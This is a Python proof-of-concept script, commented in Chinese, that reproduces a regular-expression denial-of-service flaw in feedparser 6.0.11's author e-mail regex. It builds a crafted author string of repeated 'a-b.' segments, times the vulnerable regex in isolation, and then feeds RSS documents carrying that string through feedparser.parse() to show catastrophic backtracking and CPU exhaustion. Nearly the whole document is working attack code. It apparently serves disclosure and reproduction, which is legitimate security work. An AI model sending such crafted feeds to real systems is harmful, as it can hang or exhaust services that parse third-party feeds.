#!/usr/bin/env python3
"""
feedparser <= 6.0.11  _sync_author_detail()  ReDoS (CWE-1333) — 独立复现 PoC
============================================================================

目标: pip install feedparser==6.0.11 后, 该库在解析 feed 的 <author>/dc:creator
      字段时调用 feedparser/mixin.py 中的 _sync_author_detail(), 其对 author
      字符串执行 re.search, 使用的正则包含嵌套量词 (([a-zA-Z0-9-]+\\.)+) ,
      对特制输入产生灾难性回溯 (Regular Expression Denial of Service).

本脚本两部分均可直接 `python redos_poc.py` 运行, 无需外部依赖(除 feedparser):
  PART A: 隔离正则 timing (证明正则本身超线性)
  PART B: feedparser.parse() 端到端 (证明通过真实 API 触发)

判定: 相邻规模(约 3x)耗时比值 > 2.0x 即视为超线性 (ReDoS 确认).
"""
import re
import sys
import time

try:
    import feedparser
    FP_VERSION = feedparser.__version__
except Exception as e:
    feedparser = None
    FP_VERSION = "NOT INSTALLED (%s)" % e

# 逐字复制自 feedparser/mixin.py:746 (6.0.11 安装版)
VULN = re.compile(
    r'''(([a-zA-Z0-9\_\-\.\+]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?))(\?subject=\S+)?''')

def evil_author(n, segment="a-b.", prefix="user@", suffix="!"):
    """构造恶意 author 字符串: user@ (a-b.)*n !"""
    return prefix + (segment * n) + suffix

def measure_regex(n):
    p = evil_author(n)
    s = time.perf_counter()
    m = VULN.search(p)
    return time.perf_counter() - s, bool(m)

RSS = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
<channel>
  <title>ReDoS PoC Feed</title>
  <link>https://example.com/</link>
  <description>feedparser email regex ReDoS PoC</description>
{items}
</channel>
</rss>"""

ITEM = """  <item>
    <title>Item {n}</title>
    <author>{author}</author>
    <description>normal body</description>
  </item>"""

def build_feed(n, items=1):
    a = evil_author(n)
    its = "\n".join(ITEM.format(n=i + 1, author=a) for i in range(items))
    return RSS.format(items=its)

def measure_feedparser(n):
    fx = build_feed(n)
    s = time.perf_counter()
    feedparser.parse(fx)
    return time.perf_counter() - s

def banner(t):
    print("\n" + "=" * 68 + f"\n  {t}\n" + "=" * 68)

def main():
    print("feedparser version :", FP_VERSION)
    print("python version    :", sys.version.split()[0])

    # ---------- PART A: isolated regex ----------
    banner("PART A — 隔离正则 re.search() 计时 (feedparser/mixin.py:746 同款)")
    print(f"{'segments':>9} | {'len':>7} | {'time(s)':>10} | {'ratio':>7} | result")
    print("-" * 56)
    prev = None
    sizesA = [200, 600, 1800, 5400]
    for n in sizesA:
        e, matched = measure_regex(n)
        ratio = f"{e/prev:5.2f}x" if prev and prev > 1e-4 else "  -- "
        print(f"{n:>9} | {len(evil_author(n)):>7} | {e:>10.4f} | {ratio:>7} | {'MATCH' if matched else 'NO MATCH'}")
        prev = e

    # ---------- PART B: feedparser.parse() integration ----------
    if feedparser is None:
        print("\n[SKIP] feedparser 未安装, 跳过 PART B")
        return
    banner("PART B — feedparser.parse() 端到端 (含恶意 <author> 的 RSS)")
    # baseline
    base_feed = RSS.format(items=ITEM.format(n=1, author="John Doe <john@example.com>"))
    tb = time.perf_counter(); feedparser.parse(base_feed); baseline = time.perf_counter() - tb
    print(f"baseline (正常 author): {baseline:.5f}s\n")
    print(f"{'segments':>9} | {'feed_len':>8} | {'time(s)':>10} | {'vs base':>8}")
    print("-" * 52)
    prev = None
    sizesB = [600, 1800, 5400]
    for n in sizesB:
        fx = build_feed(n)
        e = measure_feedparser(n)
        slow = f"{e/baseline:6.0f}x" if baseline > 0 else "  -- "
        print(f"{n:>9} | {len(fx):>8} | {e:>10.4f} | {slow:>8}")
        prev = e

    # ---------- verdict ----------
    banner("判定")
    t_small, _ = measure_regex(1800)
    t_big, _ = measure_regex(5400)
    ratio = t_big / t_small if t_small > 0 else 0
    # 规模约 3x, 若耗时 > 2x 即超线性
    print(f"隔离正则 1800->5400 段 (约 3x): 耗时比 = {ratio:.2f}x")
    if ratio > 2.0:
        print("[+] ReDoS 确认: 正则复杂度超线性 (灾难性回溯).")
        print("    实际影响: 攻击者控制 feed 内容(如投递第三方 RSS/Atom 源)即可")
        print("    令消费方进程 CPU 耗尽/挂起 (CWE-1333 / CWE-400).")
    else:
        print("[-] 未观察到明显超线性增长.")

if __name__ == "__main__":
    main()
